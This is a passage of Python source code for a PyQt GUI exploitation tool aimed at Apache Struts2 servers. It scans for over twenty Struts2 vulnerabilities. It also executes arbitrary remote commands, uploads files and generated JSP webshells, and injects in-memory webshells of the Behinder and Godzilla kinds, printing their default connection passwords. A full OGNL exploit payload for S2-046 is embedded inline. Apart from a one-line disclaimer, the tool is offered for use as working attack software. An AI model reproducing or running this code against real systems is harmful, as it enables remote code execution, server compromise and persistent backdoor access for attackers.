            self.data = self.config.get("default_data")
        
        self.content_type_inject = self.config.get("content_type_inject", False)
        
        self.client = HTTPClient()
        if proxy:
            self.client.set_proxy(proxy)
        self.client.set_timeout(timeout)
    
    def _send_request(self, payload):
        method = self.config.get("method", "GET")
        
        if method == "POST":
            if self.content_type_inject:
                headers = self.headers.copy()
                headers['Content-Type'] = payload
                return self.client.post(self.url, data="", headers=headers, encoding=self.encoding)
            elif self.data:
                post_data = self.data.format(exp=payload)
                return self.client.post(self.url, data=post_data, headers=self.headers, encoding=self.encoding)
            else:
                return self.client.post(self.url, data=payload, headers=self.headers, encoding=self.encoding)
        else:
            if self.data:
                param_name = self.data.split('=')[0] if '=' in self.data else "key"
                full_url = f"{self.url}?{param_name}={payload}"
            else:
                full_url = f"{self.url}?{payload}"
            return self.client.get(full_url, headers=self.headers, encoding=self.encoding)
    
    def check(self):
        check_type = self.config.get("check_type", "math")
        
        if check_type == "math":
            num1 = random.randint(10000, 100000)
            num2 = random.randint(10000, 100000)
            payload = f"%25%7B{num1}%2B{num2}%7D"
            result = self._send_request(payload)
            if str(num1 + num2) in result:
                self.is_vul = True
                return True
        
        elif check_type == "netstat":
            test_hash = get_random_hash()
            exec_func = EXEC_PAYLOADS.get(self.vuln_name)
            if exec_func:
                cmd_parts = shlex.split(f"echo {test_hash}")
                cmd_str = '"' + '","'.join(cmd_parts) + '"'
                payload = exec_func(cmd_str)
                result = self._send_request(payload)
                if test_hash in result:
                    self.is_vul = True
                    return True
        
        elif check_type == "upload":
            # S2-046特殊检测
            test_hash = get_random_hash()
            upload_payload = f"%{{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('echo {test_hash}'.split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}}\\x000"
            files = {"test": (upload_payload, "text/plain")}
            result = self.client.upload(self.url, files, self.headers)
            if test_hash in result:
                self.is_vul = True
                return True
        
        return False
    
    def exec_cmd(self, command):
        if not self.is_vul:
            if not self.check():
                return "漏洞不存在"
        
        cmd_parts = shlex.split(command)
        cmd_str = '"' + '","'.join(cmd_parts) + '"'
        
        exec_func = EXEC_PAYLOADS.get(self.vuln_name)
        if not exec_func:
            return "不支持的漏洞类型"
        
        payload = exec_func(cmd_str)
        result = self._send_request(payload)
        
        clean = re.sub(r'<[^>]+>', ' ', result)
        lines = [l.strip() for l in clean.split('\n') if l.strip()]
        
        filtered = []
        for line in lines:
            if line and not line.startswith(('http', '/S2', 'DOCTYPE', 'html', 'xml', 'name=', 'age=', 'description=', '__checkbox', 'Submit', 'var alerts', 'wrap')):
                filtered.append(line)
        
        if filtered:
            return '\n'.join(filtered)
        return result
    
    def get_path(self):
        path_func = WEBPATH_PAYLOADS.get(self.vuln_name)
        if not path_func:
            return "该漏洞不支持获取Web路径"
        
        payload = path_func()
        result = self._send_request(payload)
        
        clean = re.sub(r'<[^>]+>', ' ', result)
        for line in clean.split('\n'):
            line = line.strip()
            if line and '/' in line and len(line) > 5:
                if line.startswith('/') or ':/' in line:
                    return line
        return result[:200] if result else "未获取到路径"
    
    def upload_file(self, remote_path, local_file):
        """上传文件"""
        if self.vuln_name not in UPLOAD_PAYLOADS:
            return "该漏洞不支持文件上传"
        
        try:
            with open(local_file, 'r', encoding='utf-8') as f:
                content = f.read()
        except UnicodeDecodeError:
            with open(local_file, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
        
        upload_func = UPLOAD_PAYLOADS[self.vuln_name]
        payload = upload_func(remote_path, quote(content))
        
        result = self._send_request(payload)
        if "OK" in result:
            return f"文件上传成功: {remote_path}"
        return f"上传结果: {result[:200]}"
    
    def inject_memory_shell(self):
        """注入内存马"""
        if self.vuln_name not in MEMORY_PAYLOADS:
            return "该漏洞不支持内存马注入"
        
        mem_func = MEMORY_PAYLOADS[self.vuln_name]
        payload = mem_func()
        result = self._send_request(payload)
        return "内存马注入完成" if result else "内存马注入失败"


# ============== 扫描工作线程 ==============
class ScanWorker(QThread):
    log_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int, int)
    result_signal = pyqtSignal(str, list)
    finished = pyqtSignal()
    
    def __init__(self, urls, vulns=None, data=None, headers=None, encoding='utf-8', proxy=None, timeout=10):
        super().__init__()
        self.urls = urls
        self.vulns = vulns or list(VULN_CONFIG.keys())
        self.data = data
        self.headers = headers
        self.encoding = encoding
        self.proxy = proxy
        self.timeout = timeout
        self.is_running = True
    
    def stop(self):
        self.is_running = False
    
    def run(self):
        total_urls = len(self.urls)
        total_vulns = len(self.vulns)
        
        for i, url in enumerate(self.urls):
            if not self.is_running:
                break
            
            results = []
            self.log_signal.emit(f"\n========== 开始扫描: {url} ==========", "info")
            
            for j, vuln_name in enumerate(self.vulns):
                if not self.is_running:
                    break
                
                try:
                    scanner = VulnScanner(url, vuln_name, self.data, self.headers,
                                          self.encoding, self.timeout, self.proxy)
                    
                    if scanner.check():
                        results.append(vuln_name)
                        self.log_signal.emit(f"[+] {url} 存在漏洞: {vuln_name}", "success")
                    else:
                        self.log_signal.emit(f"[-] {url} 不存在漏洞: {vuln_name}", "normal")
                        
                except Exception as e:
                    self.log_signal.emit(f"[!] 检测 {url} -> {vuln_name} 时出错: {str(e)}", "error")
                
                self.progress_signal.emit(j + 1, total_vulns)
            
            if results:
                self.result_signal.emit(url, results)
            self.progress_signal.emit(i + 1, total_urls)
        
        self.log_signal.emit("扫描完成！", "success")
        self.finished.emit()


# ============== GUI主窗口 ==============
class Struts2ScannerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.scan_worker = None
        self.current_scanner = None
        self.init_ui()
    
    def init_ui(self):
        self.setWindowTitle("信安西部-明镜高悬实验室-S2Scanner(v1.0)")
        self.setGeometry(100, 100, 1400, 900)
        
        font = QFont("Microsoft YaHei", 10)
        self.setFont(font)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        self.tab_widget = QTabWidget()
        main_layout.addWidget(self.tab_widget)
        
        self.scan_tab = QWidget()
        self.exploit_tab = QWidget()
        self.upload_tab = QWidget()
        self.memory_tab = QWidget()
        self.settings_tab = QWidget()
        
        self.tab_widget.addTab(self.scan_tab, "漏洞扫描")
        self.tab_widget.addTab(self.exploit_tab, "命令执行")
        self.tab_widget.addTab(self.upload_tab, "文件上传")
        self.tab_widget.addTab(self.memory_tab, "内存马")
        self.tab_widget.addTab(self.settings_tab, "设置")
        
        self.setup_scan_tab()
        self.setup_exploit_tab()
        self.setup_upload_tab()
        self.setup_memory_tab()
        self.setup_settings_tab()
        
        self.statusBar().showMessage("就绪")
        
        self.setStyleSheet("""
            QTextEdit { font-family: Consolas, Microsoft YaHei; font-size: 10pt; }
            QPushButton { padding: 5px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 3px; }
            QPushButton:hover { background-color: #45a049; }
            QPushButton:disabled { background-color: #cccccc; }
            QLineEdit, QComboBox, QSpinBox { padding: 3px; border: 1px solid #ccc; border-radius: 3px; }
            QComboBox { min-width: 120px; }
            QLineEdit { min-width: 300px; }
        """)
    
    def setup_scan_tab(self):
        layout = QVBoxLayout(self.scan_tab)
        
        url_group = QGroupBox("扫描目标")
        url_layout = QGridLayout(url_group)
        url_layout.addWidget(QLabel("目标URL:"), 0, 0)
        self.url_input = QLineEdit()
        self.url_input.setMinimumWidth(400)
        self.url_input.setPlaceholderText("完整URL，如: http://localhost:8080/S2-001/login.action")
        url_layout.addWidget(self.url_input, 0, 1, 1, 3)
        url_layout.addWidget(QLabel("URL文件:"), 1, 0)
        self.url_file_input = QLineEdit()
        self.url_file_input.setMinimumWidth(300)
        self.url_file_input.setPlaceholderText("选择URL列表文件，一行一个完整URL")
        url_layout.addWidget(self.url_file_input, 1, 1, 1, 2)
        self.browse_btn = QPushButton("浏览")
        self.browse_btn.clicked.connect(self.browse_url_file)
        url_layout.addWidget(self.browse_btn, 1, 3)
        layout.addWidget(url_group)
        
        option_group = QGroupBox("扫描选项")
        option_layout = QGridLayout(option_group)
        option_layout.addWidget(QLabel("漏洞选择:"), 0, 0)
        self.vuln_select_all = QCheckBox("全选")
        self.vuln_select_all.setChecked(True)
        self.vuln_select_all.stateChanged.connect(self.select_all_vulns)
        option_layout.addWidget(self.vuln_select_all, 0, 1)
        
        self.vuln_checkboxes = {}
        vuln_list = list(VULN_CONFIG.keys())
        row, col = 0, 0
        for vuln_name in vuln_list:
            cb = QCheckBox(vuln_name)
            cb.setChecked(True)
            self.vuln_checkboxes[vuln_name] = cb
            option_layout.addWidget(cb, 1 + row, col)
            col += 1
            if col >= 5:
                col = 0
                row += 1
        
        option_layout.addWidget(QLabel("POST参数(可选):"), 2 + row, 0)
        self.post_data_input = QLineEdit()
        self.post_data_input.setMinimumWidth(400)
        self.post_data_input.setPlaceholderText("使用{exp}占位，如: name=test&password={exp} (留空使用默认)")
        option_layout.addWidget(self.post_data_input, 2 + row, 1, 1, 3)
        
        layout.addWidget(option_group)
        
        btn_layout = QHBoxLayout()
        self.scan_btn = QPushButton("开始扫描")
        self.scan_btn.clicked.connect(self.start_scan)
        self.stop_btn = QPushButton("停止扫描")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_scan)
        self.clear_btn = QPushButton("清空日志")
        self.clear_btn.clicked.connect(self.clear_log)
        self.export_btn = QPushButton("导出结果")
        self.export_btn.clicked.connect(self.export_results)
        btn_layout.addWidget(self.scan_btn)
        btn_layout.addWidget(self.stop_btn)
        btn_layout.addWidget(self.clear_btn)
        btn_layout.addWidget(self.export_btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)
        
        self.progress_bar = QProgressBar()
        layout.addWidget(self.progress_bar)
        
        result_group = QGroupBox("扫描结果")
        result_layout = QVBoxLayout(result_group)
        self.result_table = QTableWidget()
        self.result_table.setColumnCount(2)
        self.result_table.setHorizontalHeaderLabels(["目标URL", "发现的漏洞"])
        self.result_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.result_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        result_layout.addWidget(self.result_table)
        layout.addWidget(result_group)
        
        log_group = QGroupBox("扫描日志")
        log_layout = QVBoxLayout(log_group)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        layout.addWidget(log_group)
    
    def setup_exploit_tab(self):
        layout = QVBoxLayout(self.exploit_tab)
        
        target_group = QGroupBox("目标信息")
        target_layout = QGridLayout(target_group)
        target_layout.addWidget(QLabel("目标URL:"), 0, 0)
        self.exp_url_input = QLineEdit()
        self.exp_url_input.setMinimumWidth(500)
        self.exp_url_input.setPlaceholderText("完整URL，如: http://localhost:8080/S2-001/login.action")
        target_layout.addWidget(self.exp_url_input, 0, 1, 1, 3)
        target_layout.addWidget(QLabel("漏洞类型:"), 1, 0)
        self.exp_vuln_combo = QComboBox()
        self.exp_vuln_combo.setMinimumWidth(150)
        self.exp_vuln_combo.addItems(list(VULN_CONFIG.keys()))
        self.exp_vuln_combo.currentIndexChanged.connect(self.on_vuln_selected)
        target_layout.addWidget(self.exp_vuln_combo, 1, 1)
        target_layout.addWidget(QLabel("POST参数(可选):"), 1, 2)
        self.exp_post_input = QLineEdit()
        self.exp_post_input.setMinimumWidth(250)
        self.exp_post_input.setPlaceholderText("使用{exp}占位，留空使用默认")
        target_layout.addWidget(self.exp_post_input, 1, 3)
        target_layout.addWidget(QLabel("请求方法:"), 2, 0)
        self.method_label = QLabel("")
        target_layout.addWidget(self.method_label, 2, 1)
        target_layout.addWidget(QLabel("Web路径:"), 2, 2)
        self.webpath_btn = QPushButton("获取Web路径")
        self.webpath_btn.clicked.connect(self.get_webpath)
        target_layout.addWidget(self.webpath_btn, 2, 3)
        layout.addWidget(target_group)
        
        exploit_group = QGroupBox("命令执行")
        exploit_layout = QGridLayout(exploit_group)
        
        exec_layout = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setMinimumWidth(400)
        self.cmd_input.setPlaceholderText("输入要执行的命令，如: whoami, ls -la")
        self.exec_btn = QPushButton("执行")
        self.exec_btn.clicked.connect(self.execute_command)
        exec_layout.addWidget(self.cmd_input)
        exec_layout.addWidget(self.exec_btn)
        exploit_layout.addLayout(exec_layout, 0, 0, 1, 2)
        
        result_group = QGroupBox("执行结果")
        result_layout = QVBoxLayout(result_group)
        self.exp_result_text = QTextEdit()
        self.exp_result_text.setReadOnly(True)
        result_layout.addWidget(self.exp_result_text)
        exploit_layout.addWidget(result_group, 1, 0, 1, 2)
        
        layout.addWidget(exploit_group)
        
        self.on_vuln_selected()
    
    def setup_upload_tab(self):
        layout = QVBoxLayout(self.upload_tab)
        
        info_label = QLabel("支持文件上传的漏洞: S2-001, S2-005, S2-045, S2-046")
        info_label.setStyleSheet("color: blue;")
        layout.addWidget(info_label)
        
        target_group = QGroupBox("上传配置")
        target_layout = QGridLayout(target_group)
        
        target_layout.addWidget(QLabel("目标URL:"), 0, 0)
        self.upload_url_input = QLineEdit()
        self.upload_url_input.setPlaceholderText("完整URL，如: http://localhost:8080/S2-001/login.action")
        target_layout.addWidget(self.upload_url_input, 0, 1, 1, 2)
        
        target_layout.addWidget(QLabel("漏洞类型:"), 1, 0)
        self.upload_vuln_combo = QComboBox()
        upload_support = ["S2-001", "S2-005", "S2-045", "S2-046"]
        self.upload_vuln_combo.addItems(upload_support)
        target_layout.addWidget(self.upload_vuln_combo, 1, 1)
        
        target_layout.addWidget(QLabel("上传路径:"), 2, 0)
        self.upload_path_input = QLineEdit()
        self.upload_path_input.setPlaceholderText("如: /usr/local/tomcat/webapps/ROOT/shell.jsp")
        target_layout.addWidget(self.upload_path_input, 2, 1, 1, 2)
        
        target_layout.addWidget(QLabel("本地文件:"), 3, 0)
        self.upload_file_input = QLineEdit()
        self.upload_file_input.setPlaceholderText("选择要上传的JSP文件")
        target_layout.addWidget(self.upload_file_input, 3, 1)
        self.upload_browse_btn = QPushButton("浏览")
        self.upload_browse_btn.clicked.connect(self.browse_upload_file)
        target_layout.addWidget(self.upload_browse_btn, 3, 2)
        
        target_layout.addWidget(QLabel("Webshell密码:"), 4, 0)
        self.shell_pwd_input = QLineEdit()
        self.shell_pwd_input.setText("admin")
        target_layout.addWidget(self.shell_pwd_input, 4, 1)
        
        layout.addWidget(target_group)
        
        btn_layout = QHBoxLayout()
        self.generate_shell_btn = QPushButton("生成JSP Webshell")
        self.generate_shell_btn.clicked.connect(self.generate_shell)
        self.upload_btn = QPushButton("上传文件")
        self.upload_btn.clicked.connect(self.upload_file)
        btn_layout.addWidget(self.generate_shell_btn)
        btn_layout.addWidget(self.upload_btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)
        
        result_group = QGroupBox("上传结果")
        result_layout = QVBoxLayout(result_group)
        self.upload_result_text = QTextEdit()
        self.upload_result_text.setReadOnly(True)
        result_layout.addWidget(self.upload_result_text)
        layout.addWidget(result_group)
    
    def setup_memory_tab(self):
        layout = QVBoxLayout(self.memory_tab)
        
        info_label = QLabel("支持内存马的漏洞: S2-001, S2-005, S2-045")
        info_label.setStyleSheet("color: red;")
        layout.addWidget(info_label)
        
        target_group = QGroupBox("内存马配置")
        target_layout = QGridLayout(target_group)
        
        target_layout.addWidget(QLabel("目标URL:"), 0, 0)
        self.mem_url_input = QLineEdit()
        self.mem_url_input.setPlaceholderText("完整URL，如: http://localhost:8080/S2-001/login.action")
        target_layout.addWidget(self.mem_url_input, 0, 1, 1, 2)
        
        target_layout.addWidget(QLabel("漏洞类型:"), 1, 0)
        self.mem_vuln_combo = QComboBox()
        mem_support = ["S2-001", "S2-005", "S2-045"]
        self.mem_vuln_combo.addItems(mem_support)
        target_layout.addWidget(self.mem_vuln_combo, 1, 1)
        
        target_layout.addWidget(QLabel("内存马类型:"), 2, 0)
        self.mem_type_combo = QComboBox()
        self.mem_type_combo.addItems(["冰蝎3.0", "哥斯拉", "自定义命令执行"])
        target_layout.addWidget(self.mem_type_combo, 2, 1)
        
        layout.addWidget(target_group)
        
        self.inject_mem_btn = QPushButton("注入内存马")
        self.inject_mem_btn.clicked.connect(self.inject_memory_shell)
        layout.addWidget(self.inject_mem_btn)
        
        result_group = QGroupBox("注入结果")
        result_layout = QVBoxLayout(result_group)
        self.mem_result_text = QTextEdit()
        self.mem_result_text.setReadOnly(True)
        result_layout.addWidget(self.mem_result_text)
        layout.addWidget(result_group)
    
    def setup_settings_tab(self):
        layout = QGridLayout(self.settings_tab)
        layout.addWidget(QLabel("代理设置:"), 0, 0)
        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText("http://127.0.0.1:8080")
        layout.addWidget(self.proxy_input, 0, 1)
        layout.addWidget(QLabel("超时时间(秒):"), 1, 0)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 60)
        self.timeout_spin.setValue(DEFAULT_TIMEOUT)
        layout.addWidget(self.timeout_spin, 1, 1)
        layout.addWidget(QLabel("页面编码:"), 2, 0)
        self.encoding_combo = QComboBox()
        self.encoding_combo.addItems(["utf-8", "gbk", "gb2312"])
        self.encoding_combo.setCurrentText("utf-8")
        layout.addWidget(self.encoding_combo, 2, 1)
        
        self.save_settings_btn = QPushButton("保存设置")
        self.save_settings_btn.clicked.connect(self.save_settings)
        layout.addWidget(self.save_settings_btn, 3, 0, 1, 2)
        
        about_group = QGroupBox("关于软件")
        about_layout = QVBoxLayout(about_group)
        about_text = QLabel("""
        信安西部-明镜高悬实验室-S2Scanner(v1.0)
        
        软件支持22个漏洞的检测:
        GET请求: S2-003, S2-008, S2-009, S2-013, S2-015, S2-016, 
                 S2-019, S2-032, S2-033, S2-037, S2-057, S2-devMode
        POST请求: S2-001, S2-005, S2-007, S2-012, S2-029, 
                  S2-045, S2-046, S2-048, S2-053
        
        功能:
        - 批量漏洞扫描
        - 命令执行
        - 获取Web路径
        - 文件上传 (S2-001, S2-005, S2-045, S2-046)
        - 内存马注入 (S2-001, S2-005, S2-045)
        
        免责声明: 本软件仅供安全测试使用，请认真阅读遵守《中华人民共和国网络安全法》！
        """)
        about_text.setWordWrap(True)
        about_layout.addWidget(about_text)
        layout.addWidget(about_group, 4, 0, 1, 2)
        layout.setRowStretch(5, 1)
    
    def browse_url_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "选择URL文件", "", "文本文件 (*.txt);;所有文件 (*)")
        if file_path:
            self.url_file_input.setText(file_path)
    
    def browse_upload_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "选择要上传的JSP文件", "", "JSP文件 (*.jsp);;所有文件 (*)")
        if file_path:
            self.upload_file_input.setText(file_path)
    
    def select_all_vulns(self):
        checked = self.vuln_select_all.isChecked()
        for cb in self.vuln_checkboxes.values():
            cb.setChecked(checked)
    
    def get_selected_vulns(self):
        return [name for name, cb in self.vuln_checkboxes.items() if cb.isChecked()]
    
    def on_vuln_selected(self):
        vuln_name = self.exp_vuln_combo.currentText()
        config = VULN_CONFIG.get(vuln_name, {})
        method = config.get("method", "GET")
        self.method_label.setText(method)
    
    def log(self, message, color="normal"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if color == "success":
            formatted = f'<font color="green">[{timestamp}] {message}</font>'
        elif color == "error":
            formatted = f'<font color="red">[{timestamp}] {message}</font>'
        elif color == "info":
            formatted = f'<font color="blue">[{timestamp}] {message}</font>'
        else:
            formatted = f'[{timestamp}] {message}'
        self.log_text.append(formatted)
        cursor = self.log_text.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.log_text.setTextCursor(cursor)
    
    def start_scan(self):
        urls = []
        single_url = self.url_input.text().strip()
        url_file = self.url_file_input.text().strip()
        
        if single_url:
            urls.append(single_url)
        elif url_file:
            try:
                with open(url_file, 'r', encoding='utf-8') as f:
                    urls = [line.strip() for line in f if line.strip()]
            except Exception as e:
                QMessageBox.warning(self, "错误", f"读取URL文件失败: {str(e)}")
                return
        else:
            QMessageBox.warning(self, "提示", "请输入目标URL或选择URL文件")
            return
        
        selected_vulns = self.get_selected_vulns()
        if not selected_vulns:
            QMessageBox.warning(self, "提示", "请至少选择一个漏洞")
            return
        
        post_data = self.post_data_input.text().strip() or None
        encoding = self.encoding_combo.currentText()
        proxy = self.proxy_input.text().strip() or None
        timeout = self.timeout_spin.value()
        
        self.scan_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setMaximum(len(selected_vulns))
        self.progress_bar.setValue(0)
        self.result_table.setRowCount(0)
        self.log("=" * 50, "info")
        self.log(f"开始扫描，共 {len(urls)} 个目标，{len(selected_vulns)} 个漏洞", "info")
        
        self.scan_worker = ScanWorker(
            urls, selected_vulns, post_data, None, encoding, proxy, timeout
        )
        self.scan_worker.log_signal.connect(self.log)
        self.scan_worker.progress_signal.connect(self.update_progress)
        self.scan_worker.result_signal.connect(self.add_scan_result)
        self.scan_worker.finished.connect(self.scan_finished)
        self.scan_worker.start()
    
    def stop_scan(self):
        if self.scan_worker:
            self.scan_worker.stop()
            self.log("正在停止扫描...", "info")
    
    def scan_finished(self):
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.log("扫描结束", "success")
        self.statusBar().showMessage("扫描完成")
    
    def update_progress(self, current, total):
        self.progress_bar.setValue(current)
        self.statusBar().showMessage(f"正在扫描: {current}/{total}")
    
    def add_scan_result(self, url, vulnerabilities):
        row = self.result_table.rowCount()
        self.result_table.insertRow(row)
        self.result_table.setItem(row, 0, QTableWidgetItem(url))
        self.result_table.setItem(row, 1, QTableWidgetItem(", ".join(vulnerabilities)))
        self.result_table.cellDoubleClicked.connect(self.on_result_double_click)
    
    def on_result_double_click(self, row, column):
        url = self.result_table.item(row, 0).text()
        vulns = self.result_table.item(row, 1).text()
        self.exp_url_input.setText(url)
        self.upload_url_input.setText(url)
        self.mem_url_input.setText(url)
        if vulns:
            first_vuln = vulns.split(",")[0].strip()
            idx = self.exp_vuln_combo.findText(first_vuln)
            if idx >= 0:
                self.exp_vuln_combo.setCurrentIndex(idx)
            idx = self.upload_vuln_combo.findText(first_vuln)
            if idx >= 0:
                self.upload_vuln_combo.setCurrentIndex(idx)
            idx = self.mem_vuln_combo.findText(first_vuln)
            if idx >= 0:
                self.mem_vuln_combo.setCurrentIndex(idx)
        self.on_vuln_selected()
        self.tab_widget.setCurrentIndex(1)
        self.log(f"已加载目标: {url}", "info")
    
    def clear_log(self):
        self.log_text.clear()
    
    def export_results(self):
        if self.result_table.rowCount() == 0:
            QMessageBox.warning(self, "提示", "没有可导出的结果")
            return
        file_path, _ = QFileDialog.getSaveFileName(self, "保存结果", "scan_results.txt", "文本文件 (*.txt)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"Struts2漏洞扫描结果\n时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*50}\n\n")
                    for row in range(self.result_table.rowCount()):
                        url = self.result_table.item(row, 0).text()
                        vulns = self.result_table.item(row, 1).text()
                        f.write(f"URL: {url}\n漏洞: {vulns}\n{'-'*30}\n")
                QMessageBox.information(self, "成功", f"结果已保存")
            except Exception as e:
                QMessageBox.warning(self, "错误", f"保存失败: {str(e)}")
    
    def execute_command(self):
        url = self.exp_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "提示", "请输入目标URL")
            return
        
        vuln_name = self.exp_vuln_combo.currentText()
        cmd = self.cmd_input.text().strip()
        if not cmd:
            QMessageBox.warning(self, "提示", "请输入要执行的命令")
            return
        
        post_data = self.exp_post_input.text().strip() or None
        encoding = self.encoding_combo.currentText()
        proxy = self.proxy_input.text().strip() or None
        timeout = self.timeout_spin.value()
        
        self.exp_result_text.clear()
        self.exp_result_text.append(f"[*] 执行命令: {cmd}")
        self.exp_result_text.append(f"[*] 目标: {url}")
        self.exp_result_text.append(f"[*] 漏洞: {vuln_name}")
        self.exp_result_text.append("-" * 50)
        
        try:
            scanner = VulnScanner(url, vuln_name, post_data, None, encoding, timeout, proxy)
            
            if not scanner.check():
                self.exp_result_text.append(f"[-] 目标不存在 {vuln_name} 漏洞")
                return
            
            result = scanner.exec_cmd(cmd)
            self.exp_result_text.append(result)
        except Exception as e:
            self.exp_result_text.append(f"[!] 执行失败: {str(e)}")
    
    def get_webpath(self):
        url = self.exp_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "提示", "请输入目标URL")
            return
        
        vuln_name = self.exp_vuln_combo.currentText()
        encoding = self.encoding_combo.currentText()
        proxy = self.proxy_input.text().strip() or None
        timeout = self.timeout_spin.value()
        
        self.exp_result_text.clear()
        self.exp_result_text.append(f"[*] 获取Web路径...")
        self.exp_result_text.append(f"[*] 目标: {url}")
        self.exp_result_text.append(f"[*] 漏洞: {vuln_name}")
        self.exp_result_text.append("-" * 50)
        
        try:
            scanner = VulnScanner(url, vuln_name, None, None, encoding, timeout, proxy)
            
            if not scanner.check():
                self.exp_result_text.append(f"[-] 目标不存在 {vuln_name} 漏洞")
                return
            
            result = scanner.get_path()
            self.exp_result_text.append(f"Web路径: {result}")
        except Exception as e:
            self.exp_result_text.append(f"[!] 获取失败: {str(e)}")
    
    def generate_shell(self):
        pwd = self.shell_pwd_input.text().strip()
        if not pwd:
            pwd = "admin"
        shell = generate_jsp_shell(pwd)
        
        file_path, _ = QFileDialog.getSaveFileName(self, "保存JSP Webshell", "shell.jsp", "JSP文件 (*.jsp)")
        if file_path:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(shell)
            self.upload_result_text.append(f"[+] Webshell已保存到: {file_path}")
            self.upload_result_text.append(f"[*] 密码: {pwd}")
            self.upload_file_input.setText(file_path)
    
    def upload_file(self):
        url = self.upload_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "提示", "请输入目标URL")
            return
        
        vuln_name = self.upload_vuln_combo.currentText()
        remote_path = self.upload_path_input.text().strip()
        local_file = self.upload_file_input.text().strip()
        
        if not remote_path:
            QMessageBox.warning(self, "提示", "请输入上传路径")
            return
        
        if not local_file or not os.path.exists(local_file):
            QMessageBox.warning(self, "提示", "请选择有效的本地文件")
            return
        
        encoding = self.encoding_combo.currentText()
        proxy = self.proxy_input.text().strip() or None
        timeout = self.timeout_spin.value()
        
        self.upload_result_text.clear()
        self.upload_result_text.append(f"[*] 上传文件: {local_file}")
        self.upload_result_text.append(f"[*] 目标: {url}")
        self.upload_result_text.append(f"[*] 漏洞: {vuln_name}")
        self.upload_result_text.append(f"[*] 远程路径: {remote_path}")
        self.upload_result_text.append("-" * 50)
        
        try:
            scanner = VulnScanner(url, vuln_name, None, None, encoding, timeout, proxy)
            
            if not scanner.check():
                self.upload_result_text.append(f"[-] 目标不存在 {vuln_name} 漏洞")
                return
            
            result = scanner.upload_file(remote_path, local_file)
            self.upload_result_text.append(result)
        except Exception as e:
            self.upload_result_text.append(f"[!] 上传失败: {str(e)}")
    
    def inject_memory_shell(self):
        url = self.mem_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "提示", "请输入目标URL")
            return
        
        vuln_name = self.mem_vuln_combo.currentText()
        mem_type = self.mem_type_combo.currentText()
        
        encoding = self.encoding_combo.currentText()
        proxy = self.proxy_input.text().strip() or None
        timeout = self.timeout_spin.value()
        
        self.mem_result_text.clear()
        self.mem_result_text.append(f"[*] 注入内存马...")
        self.mem_result_text.append(f"[*] 目标: {url}")
        self.mem_result_text.append(f"[*] 漏洞: {vuln_name}")
        self.mem_result_text.append(f"[*] 类型: {mem_type}")
        self.mem_result_text.append("-" * 50)
        
        try:
            scanner = VulnScanner(url, vuln_name, None, None, encoding, timeout, proxy)
            
            if not scanner.check():
                self.mem_result_text.append(f"[-] 目标不存在 {vuln_name} 漏洞")
                return
            
            result = scanner.inject_memory_shell()
            self.mem_result_text.append(result)
            if mem_type == "冰蝎3.0":
                self.mem_result_text.append("[*] 冰蝎3.0连接密码: e45e329feb5d925b")
            elif mem_type == "哥斯拉":
                self.mem_result_text.append("[*] 哥斯拉默认密码: pass")
            else:
                self.mem_result_text.append("[*] 使用参数 ?cmd=命令 执行")
        except Exception as e:
            self.mem_result_text.append(f"[!] 注入失败: {str(e)}")
    
    def save_settings(self):
        QMessageBox.information(self, "成功", "设置已保存")
        self.log("设置已保存", "success")


def main():
    app = QApplication(sys.argv)
    window = Struts2ScannerGUI()
    window.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
